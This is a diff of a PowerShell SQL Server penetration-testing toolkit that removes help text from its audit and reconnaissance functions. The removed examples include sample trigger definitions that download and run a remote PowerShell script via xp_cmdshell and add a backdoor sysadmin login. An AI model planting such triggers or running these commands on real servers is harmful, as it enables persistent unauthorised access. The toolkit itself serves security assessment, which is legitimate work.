-            PS C:\> Get-SQLDomainTrust -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-            PS C:\> Get-SQLDomainTrust -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainTrust -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainTrust -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -6027,47 +5394,8 @@ Function  Get-SQLDomainTrust
     }
 }
 
-
-
-# ----------------------------------
-#  Get-SQLDomainController
-# ----------------------------------
-
 Function  Get-SQLDomainController
 {
-    <#
-            .SYNOPSIS
-            Using the OLE DB ADSI provider, query Active Directory for a list of domain controllers
-            via the domain logon server associated with the SQL Server.  This can be 
-            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-            flag to switch between modes.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER LinkUsername
-            Domain account used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER LinkPassword
-            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER UseAdHoc
-            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TargetDomain
-            Domain to query.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainController -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainController -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-            PS C:\> Get-SQLDomainController -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainController -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainController -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -6135,45 +5463,8 @@ Function  Get-SQLDomainController
     }
 }
 
-# ----------------------------------
-#  Get-SQLDomainExploitableSystem
-# ----------------------------------
-
 Function  Get-SQLDomainExploitableSystem
 {
-    <#
-            .SYNOPSIS
-            Using the OLE DB ADSI provider, query Active Directory for a list of domain exploitable computers
-            via the domain logon server associated with the SQL Server.  This can be 
-            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-            flag to switch between modes.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER LinkUsername
-            Domain account used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER LinkPassword
-            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER UseAdHoc
-            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TargetDomain
-            Domain to query.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainExploitableSystem -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainExploitableSystem -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-            PS C:\> Get-SQLDomainExploitableSystem -Instance SQLServer1\STANDARDDEV2014 -Verbose 
-            .EXAMPLE
-            PS C:\> Get-SQLDomainExploitableSystem -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainExploitableSystem -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -6362,47 +5653,8 @@ Function  Get-SQLDomainExploitableSystem
     }
 }
 
-# ----------------------------------
-#  Get-SQLDomainGroupMember
-# ----------------------------------
-
 Function  Get-SQLDomainGroupMember
 {
-    <#
-            .SYNOPSIS
-            Using the OLE DB ADSI provider, query Active Directory for a list of domain group members
-            via the domain logon server associated with the SQL Server.  This can be 
-            done using a SQL Server link (OpenQuery) or AdHoc query (OpenRowset).  Use the -UseAdHoc
-            flag to switch between modes.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER LinkUsername
-            Domain account used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER LinkPassword
-            Domain account password used to authenticate to LDAP through SQL Server ADSI link.
-            .PARAMETER UseAdHoc
-            Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TargetDomain
-            Domain to query.
-            .PARAMETER FilterGroup
-            Domain group to filter for.
-            .EXAMPLE
-            PS C:\> Get-SQLDomainGroupMember -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -FilterGroup 'Enterprise Admins'
-            .EXAMPLE
-            PS C:\> Get-SQLDomainGroupMember -Instance SQLServer1\STANDARDDEV2014 -Verbose -UseAdHoc -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-          .EXAMPLE
-            PS C:\> Get-SQLDomainGroupMember -Instance SQLServer1\STANDARDDEV2014 -Verbose -FilterGroup 'Enterprise Admins'
-            .EXAMPLE
-            PS C:\> Get-SQLDomainGroupMember -Instance SQLServer1\STANDARDDEV2014 -Verbose -LinkUsername 'domain\user' -LinkPassword 'Password123!'
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDomainGroupMember -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -6500,32 +5752,8 @@ Function  Get-SQLDomainGroupMember
     }
 }
 
-# ----------------------------------
-#  Get-SQLSysadminCheck
-# ----------------------------------
-
 Function  Get-SQLSysadminCheck
 {
-    <#
-            .SYNOPSIS
-            Check if login is has sysadmin privilege on the target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .EXAMPLE
-            PS C:\> Get-SQLSysadminCheck -Instance SQLServer1\STANDARDDEV2014
-
-            ComputerName   Instance                       IsSysadmin
-            ------------   --------                       ----------
-            SQLServer1     SQLServer1\STANDARDDEV2014     Yes
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcure -Verbose -NoDefaults
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -6622,19 +5850,8 @@ Function  Get-SQLSysadminCheck
 }
 
 
-# ----------------------------------
-#  Get-SQLLocalAdminCheck
-# ----------------------------------
-
 Function  Get-SQLLocalAdminCheck
 {
-    <#
-            .SYNOPSIS
-            Check if the current Windows user is running in a local adminsitrator context.
-            PS C:\> Get-SQLLocalAdminCheck
-
-            $true
-    #>
     Begin
     {
     }
@@ -6662,39 +5879,9 @@ Function  Get-SQLLocalAdminCheck
     }
 }
 
-# ----------------------------------
-#  Get-SQLServiceAccount
-# ----------------------------------
-
 Function  Get-SQLServiceAccount
 {
-    <#
-            .SYNOPSIS
-            Returns a list of service account names for SQL Servers services by querying the registry with xp_regread.  This can be executed against remote systems.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .EXAMPLE
-            PS C:\> Get-SQLServiceAccount -Instance SQLServer1\STANDARDDEV2014
 
-            ComputerName     : SQLServer1
-            Instance         : SQLServer1\STANDARDDEV2014
-            DBEngineLogin    : LocalSystem
-            AgentLogin       : NT Service\SQLAgent$STANDARDDEV2014
-            BrowserLogin     : NT AUTHORITY\LOCALSERVICE
-            WriterLogin      : LocalSystem
-            AnalysisLogin    : NT Service\MSOLAP$STANDARDDEV2014
-            ReportLogin      : NT Service\ReportServer$STANDARDDEV2014
-            IntegrationLogin : NT Service\MsDtsServer120
-
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLServiceAccount -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -6874,63 +6061,8 @@ Function  Get-SQLServiceAccount
     }
 }
 
-# ----------------------------------
-#  Get-SQLAgentJob
-# ----------------------------------
-# Author: Leo Loobeek and Scott Sutherland
 Function  Get-SQLAgentJob
 {
-    <#
-            .SYNOPSIS
-            This function will check the current login's privileges and return a list
-            of the jobs they have privileges to view.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER ProxyCredential
-            Only return SQL Agent jobs using a specific proxy credential.
-            .PARAMETER UsingProxyCredential
-            Only return SQL Agent jobs using a proxy credentials.
-            .PARAMETER SubSystem
-            Only return SQL Agent jobs for specific subsystems.
-            .PARAMETER Keyword
-            Only return SQL Agent jobs that have a command that includes a specific keyword.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
-            .PARAMETER TimeOut
-            Connection time out.
-            .PARAMETER SuppressVerbose
-            Suppress verbose errors.  Used when function is wrapped.
-            .EXAMPLE
-             PS C:\> Get-SQLInstanceLocal | Get-SQLAgentJob -Verbose -Username sa -Password 'Password123!' | select Instance, Job_name, Step_name, SubSystem, Command | ft
-            VERBOSE: SQL Server Agent Job Search Starting...
-            VERBOSE: MSSQLSRV04\BOSCHSQL : Connection Failed.
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Connection Success.
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : - SQL Server Agent service enabled.
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : - Attempting to list existing agent jobs as sa.
-            VERBOSE: MSSQLSRV04\SQLSERVER2014 : - 4 agent jobs found.
-            VERBOSE: MSSQLSRV04\SQLSERVER2016 : Connection Success.
-            VERBOSE: MSSQLSRV04\SQLSERVER2016 : - SQL Server Agent service has not been started.
-            VERBOSE: MSSQLSRV04\SQLSERVER2016 : - Attempting to list existing agent jobs as sa.
-            VERBOSE: MSSQLSRV04\SQLSERVER2016 : - 3 agent jobs found.
-            VERBOSE: 7 agents jobs were found in total.
-            VERBOSE: SQL Server Agent Job Search Complete.
-
-            Instance                               JOB_NAME                              step_name                             subsystem                             command                              
-            --------                               --------                              ---------                             ---------                             -------                              
-            MSSQLSRV04\SQLSERVER2014               syspolicy_purge_history               Verify that automation is enabled.    TSQL                                  IF (msdb.dbo.fn_syspolicy_is_autom...
-            MSSQLSRV04\SQLSERVER2014               syspolicy_purge_history               Purge history.                        TSQL                                  EXEC msdb.dbo.sp_syspolicy_purge_h...
-            MSSQLSRV04\SQLSERVER2014               syspolicy_purge_history               Erase Phantom System Health Records.  PowerShell                            if ('$(ESCAPE_SQUOTE(INST))' -eq '...
-            MSSQLSRV04\SQLSERVER2014               test                                  test1                                 CmdExec                               whoami                               
-            MSSQLSRV04\SQLSERVER2016               syspolicy_purge_history               Verify that automation is enabled.    TSQL                                  IF (msdb.dbo.fn_syspolicy_is_autom...
-            MSSQLSRV04\SQLSERVER2016               syspolicy_purge_history               Purge history.                        TSQL                                  EXEC msdb.dbo.sp_syspolicy_purge_h...
-            MSSQLSRV04\SQLSERVER2016               syspolicy_purge_history               Erase Phantom System Health Records.  PowerShell                            if ('$(ESCAPE_SQUOTE(INST))' -eq '...
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -7252,36 +6384,8 @@ Function  Get-SQLAgentJob
     }
 }
 
-# ----------------------------------
-#  Get-SQLDBSpec
-# ----------------------------------
-
 Function  Get-SQLDBSpec
 {
-    <#
-            .SYNOPSIS
-            Returns Audit database specifications from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
-            .PARAMETER AuditName
-            Audit name.
-            .PARAMETER AuditSpecification
-            Audit specification.
-            .PARAMETER AuditAction
-            Audit action name.
-            .EXAMPLE
-            PS C:\> Get-SQLDBSpec -Verbose -Instance "SQLServer1"
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDBSpec -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -7434,36 +6538,8 @@ Function  Get-SQLDBSpec
 }
 
 
-# ----------------------------------
-#  Get-SQLAuditServerSpec
-# ----------------------------------
-
 Function  Get-SQLAuditServerSpec
 {
-    <#
-            .SYNOPSIS
-            Returns Audit server specifications from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
-            .PARAMETER AuditName
-            Audit name.
-            .PARAMETER AuditSpecification
-            Audit specification.
-            .PARAMETER AuditAction
-            Audit action name.
-            .EXAMPLE
-            PS C:\> Get-SQLAuditServerSpec -Verbose -Instance "SQLServer1"
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLAuditServerSpec -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -7609,40 +6685,9 @@ Function  Get-SQLAuditServerSpec
 }
 
 
-# ----------------------------------
-#  Get-SQLServerPriv
-# ----------------------------------
-
 Function  Get-SQLServerPriv
 {
-    <#
-            .SYNOPSIS
-            Returns SQL Server login privilege information from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER PermissionName
-            Permission name to filter for.
-            .EXAMPLE
-            PS C:\> Get-SQLServerPriv -Instance SQLServer1\STANDARDDEV2014 -PermissionName IMPERSONATE
 
-            ComputerName    : SQLServer1
-            Instance        : SQLServer1\STANDARDDEV2014
-            GranteeName     : public
-            GrantorName     : sa
-            PermissionClass : SERVER_PRINCIPAL
-            PermissionName  : IMPERSONATE
-            PermissionState : GRANT
-            ObjectName      : sa
-            ObjectType      : SQL_LOGIN
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLServerPriv -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -7760,51 +6805,9 @@ Function  Get-SQLServerPriv
 }
 
 
-# ----------------------------------
-#  Get-SQLDatabasePriv
-# ----------------------------------
-
 Function  Get-SQLDatabasePriv
 {
-    <#
-            .SYNOPSIS
-            Returns database user privilege information from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER NoDefaults
-            Only select non default databases.
-            .PARAMETER PermissionName
-            Permission name to filter for.
-            .PARAMETER PermissionType
-            Permission type name to filter for.
-            .PARAMETER PrincipalName
-            Principal name to filter for.
-            .EXAMPLE
-            PS C:\> Get-SQLDatabasePriv -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PermissionName "VIEW DEFINITION"
 
-            ComputerName     : SQLServer1
-            Instance         : SQLServer1\STANDARDDEV2014
-            DatabaseName     : testdb
-            PrincipalName    : createprocuser
-            PrincipalType    : SQL_USER
-            PermissionType   : SCHEMA
-            PermissionName   : VIEW DEFINITION
-            StateDescription : GRANT
-            ObjectType       : SCHEMA
-            ObjectName       : dbo
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabasePriv -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -7972,52 +6975,9 @@ Function  Get-SQLDatabasePriv
 }
 
 
-# ----------------------------------
-#  Get-SQLDatabaseUser
-# ----------------------------------
-
 Function  Get-SQLDatabaseUser
 {
-    <#
-            .SYNOPSIS
-            Returns database user information from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER DatabaseUser
-            Database user to filter for.
-            .PARAMETER PrincipalName
-            Principal name to filter for.
-            .PARAMETER NoDefaults
-            Only show information for non default databases.
 
-            .EXAMPLE
-            PS C:\> Get-SQLDatabaseUser -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PrincipalName evil
-
-            ComputerName       : SQLServer1
-            Instance           : SQLServer1\STANDARDDEV2014
-            DatabaseName       : testdb
-            DatabaseUserId     : 5
-            DatabaseUser       : evil
-            PrincipalSid       : 3E26CA9124B4AE42ABF1BBF2523738CA
-            PrincipalName      : evil
-            PrincipalType      : SQL_USER
-            deault_schema_name : dbo
-            create_date        : 04/22/2016 13:00:33
-            is_fixed_role      : False
-            [TRUNCATED]
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseUser -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -8223,47 +7183,9 @@ Function  Get-SQLDatabaseUser
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLServerRole
-# ----------------------------------
-
 Function  Get-SQLServerRole
 {
-    <#
-            .SYNOPSIS
-            Returns SQL Server role information from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER RolePrincipalName
-            Role principal name to filter for.
-            .PARAMETER RoleOwner
-            Role owner name to filter for.
-            .EXAMPLE
-            PS C:\> Get-SQLServerRole -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 1
 
-            ComputerName          : SQLServer1
-            Instance              : SQLServer1\STANDARDDEV2014
-            RolePrincipalId       : 2
-            RolePrincipalSid      : 2
-            RolePrincipalName     : public
-            RolePrincipalType     : SERVER_ROLE
-            OwnerPrincipalId      : 1
-            OwnerPrincipalName    : sa
-            is_disabled           : False
-            is_fixed_role         : False
-            create_date           : 4/13/2009 12:59:06 PM
-            modify_Date           : 4/13/2009 12:59:06 PM
-            default_database_name :
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLServerRole -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -8431,54 +7353,9 @@ Function  Get-SQLServerRole
     }
 }
 
-
-# ----------------------------------
-#  Get-SQLServerRoleMember
-# ----------------------------------
-
 Function  Get-SQLServerRoleMember
 {
-    <#
-            .SYNOPSIS
-            Returns SQL Server role member information from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER RolePrincipalName
-            Role principal name to filter for.
-            .PARAMETER PrincipalName
-            Principal name to filter for.
-            .EXAMPLE
-            PS C:\> Get-SQLServerRoleMember -Instance SQLServer1\STANDARDDEV2014 -PrincipalName MyUser
 
-            ComputerName      : SQLServer1
-            Instance          : SQLServer1\STANDARDDEV2014
-            RolePrincipalId   : 3
-            RolePrincipalName : sysadmin
-            PrincipalId       : 272
-            PrincipalName     : MyUser
-
-            ComputerName      : SQLServer1
-            Instance          : SQLServer1\STANDARDDEV2014
-            RolePrincipalId   : 6
-            RolePrincipalName : setupadmin
-            PrincipalId       : 272
-            PrincipalName     : MyUser
-
-            ComputerName      : SQLServer1
-            Instance          : SQLServer1\STANDARDDEV2014
-            RolePrincipalId   : 276
-            RolePrincipalName : MyCustomRole
-            PrincipalId       : 272
-            PrincipalName     : MyUser
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLServerRoleMember -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -8596,54 +7473,9 @@ Function  Get-SQLServerRoleMember
 }
 
 
-# ----------------------------------
-#  Get-SQLDatabaseRole
-# ----------------------------------
-
-# Reference: https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx
 Function  Get-SQLDatabaseRole
 {
-    <#
-            .SYNOPSIS
-            Returns database role information from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER NoDefaults
-            Only select non default databases.
-            .PARAMETER RolePrincipalName
-            Role principalname to filter for.
-            .PARAMETER RoleOwner
-            Role owner's name to filter for.
 
-            .EXAMPLE
-            PS C:\> Get-SQLDatabaseRole -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -RolePrincipalName DB_OWNER
-
-            ComputerName        : SQLServer1
-            Instance            : SQLServer1\STANDARDDEV2014
-            DatabaseName        : testdb
-            RolePrincipalId     : 16384
-            RolePrincipalSid    : 01050000000000090400000000000000000000000000000000400000
-            RolePrincipalName   : db_owner
-            RolePrincipalType   : DATABASE_ROLE
-            OwnerPrincipalId    : 1
-            OwnerPrincipalName  : sa
-            is_fixed_role       : True
-            create_date         : 4/8/2003 9:10:42 AM
-            modify_Date         : 4/13/2009 12:59:14 PM
-            default_schema_name :
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseRole -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -8843,53 +7675,9 @@ Function  Get-SQLDatabaseRole
 }
 
 
-# ----------------------------------
-#  Get-SQLDatabaseRoleMember
-# ----------------------------------
-
 Function  Get-SQLDatabaseRoleMember
 {
-    <#
-            .SYNOPSIS
-            Returns database role member information from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DAC
-            Connect using Dedicated Admin Connection.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER RolePrincipalName
-            Role principalname to filter for.
-            .PARAMETER PrincipalName
-            Name of principal or Role to filter for.
 
-            .EXAMPLE
-            PS C:\> Get-SQLDatabaseRoleMember -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PrincipalName evil
-
-            ComputerName      : SQLServer1
-            Instance          : SQLServer1\STANDARDDEV2014
-            DatabaseName      : testdb
-            RolePrincipalId   : 16387
-            RolePrincipalName : db_ddladmin
-            PrincipalId       : 5
-            PrincipalName     : evil
-
-            ComputerName      : SQLServer1
-            Instance          : SQLServer1\STANDARDDEV2014
-            DatabaseName      : testdb
-            RolePrincipalId   : 16391
-            RolePrincipalName : db_datawriter
-            PrincipalId       : 5
-            PrincipalName     : evil
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabaseRoleMember -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -9052,55 +7840,7 @@ Function  Get-SQLDatabaseRoleMember
 
 Function  Get-SQLTriggerDdl
 {
-    <#
-            .SYNOPSIS
-            Returns DDL trigger information from target SQL Servers. This includes logon triggers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER TriggerName
-            Trigger name to filter for.
-            .EXAMPLE
-            PS C:\> Get-SQLTriggerDdl -Instance SQLServer1\STANDARDDEV2014
-
-            ComputerName      : SQLServer1
-            Instance          : SQLServer1\STANDARDDEV2014
-            TriggerName       : persistence_ddl_1
-            TriggerId         : 1104722988
-            TriggerType       : SERVER
-            ObjectType        : SQL_TRIGGER
-            ObjectClass       : SERVER
-            TriggerDefinition : -- Create the DDL trigger
-            CREATE Trigger [persistence_ddl_1]
-            ON ALL Server
-            FOR DDL_LOGIN_EVENTS
-            AS
-
-            -- Download and run a PowerShell script from the internet
-            EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object
-            net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_ddl.ps1'')"';
-
-            -- Add a sysadmin named 'SysAdmin_DDL' if it doesn't exist
-            if (SELECT count(name) FROM sys.sql_logins WHERE name like 'SysAdmin_DDL') = 0
-
-            -- Create a login
-            CREATE LOGIN SysAdmin_DDL WITH PASSWORD = 'Password123!';
-
-            -- Add the login to the sysadmin fixed server role
-            EXEC sp_addsrvrolemember 'SysAdmin_DDL', 'sysadmin';
-
-            create_date       : 4/26/2016 8:34:49 PM
-            modify_date       : 4/26/2016 8:34:49 PM
-            is_ms_shipped     : False
-            is_disabled       : False
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLTriggerDdl -Verbose
-    #>
+ 
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -9217,62 +7957,7 @@ Function  Get-SQLTriggerDdl
 
 Function  Get-SQLTriggerDml
 {
-    <#
-            .SYNOPSIS
-            Returns DML trigger information from target SQL Servers.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DatabaseName
-            Database name to filter for.
-            .PARAMETER TriggerName
-            Trigger name to filter for.
-            .EXAMPLE
-            PS C:\> Get-SQLTriggerDml -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb
-
-            ComputerName           : SQLServer1
-            Instance               : SQLServer1\STANDARDDEV2014
-            DatabaseName           : testdb
-            TriggerName            : persistence_dml_1
-            TriggerId              : 565577053
-            TriggerType            : DATABASE
-            ObjectType             : SQL_TRIGGER
-            ObjectClass            : OBJECT_OR_COLUMN
-            TriggerDefinition      : -- Create trigger
-            CREATE TRIGGER [persistence_dml_1]
-            ON testdb.dbo.NOCList
-            FOR INSERT, UPDATE, DELETE AS
-
-            -- Impersonate sa
-            EXECUTE AS LOGIN = 'sa'
-
-            -- Download a PowerShell script from the internet to memory and execute it
-            EXEC master..xp_cmdshell 'Powershell -c "IEX(new-object
-            net.webclient).downloadstring(''https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/trigger_demo_dml.ps1'')"';
-
-            -- Add a sysadmin named 'SysAdmin_DML' if it doesn't exist
-            if (select count(*) from sys.sql_logins where name like 'SysAdmin_DML') = 0
-
-            -- Create a login
-            CREATE LOGIN SysAdmin_DML WITH PASSWORD = 'Password123!';
-
-            -- Add the login to the sysadmin fixed server role
-            EXEC sp_addsrvrolemember 'SysAdmin_DML', 'sysadmin';
-
-            create_date            : 4/26/2016 8:58:28 PM
-            modify_date            : 4/26/2016 8:58:28 PM
-            is_ms_shipped          : False
-            is_disabled            : False
-            is_not_for_replication : False
-            is_instead_of_trigger  : False
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Get-SQLTriggerDml -Verbose
-    #>
+  
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -9408,57 +8093,9 @@ Function  Get-SQLTriggerDml
 }
 
 
-# ----------------------------------
-#  Get-SQLStoredProcedureCLR
-# ----------------------------------
-
 Function  Get-SQLStoredProcedureCLR
 {
-    <#
-            .SYNOPSIS
-            Returns stored procedures created from CLR assemblies for each accessible database.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER DAC
